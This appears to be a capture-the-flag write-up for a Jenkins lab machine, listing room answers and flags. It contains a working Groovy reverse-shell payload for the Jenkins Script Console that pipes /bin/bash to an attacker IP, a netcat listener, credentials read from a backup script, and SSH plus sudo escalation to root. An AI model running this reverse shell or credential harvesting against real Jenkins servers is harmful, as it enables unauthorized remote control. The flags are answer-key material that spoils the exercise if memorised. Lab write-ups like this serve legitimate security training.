Script Console in Jenkins
```groovy
String host="10.10.83.43";
int port=1337;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
on shell
```bash
nc -lvnp 1337
```
this revshell will not display a prompt, but you can run commands
```bash
cat /opt/scripts/backup.sh
```
```
...
username="tracy"
password="13_1n_33"
...
```
```bash
ssh tracy@10.10.151.235
sudo -l
sudo su
```

# Default port for Jenkins
8080

# Password for tracy
13_1n_33

# Root flag
`cat /root/flag.txt`
ezRo0tW1thoutDiD

# error message after removing tracy from sudoers and trying sudo -l
```
admin@jenkins:~$ sudo deluser tracy sudo
tracy@jenkins:~$ sudo -l
```
Sorry, user tracy may not run sudo on jenkins.

# SSH flag
```bash
cat /etc/ssh/sshd_config
```
Ne3d2SecureTh1sSecureSh31l

# Jenkins flag
```bash
cat /var/lib/jenkins/config.xml.bak
```
FullTrust_has_n0_Place1nS3cur1ty
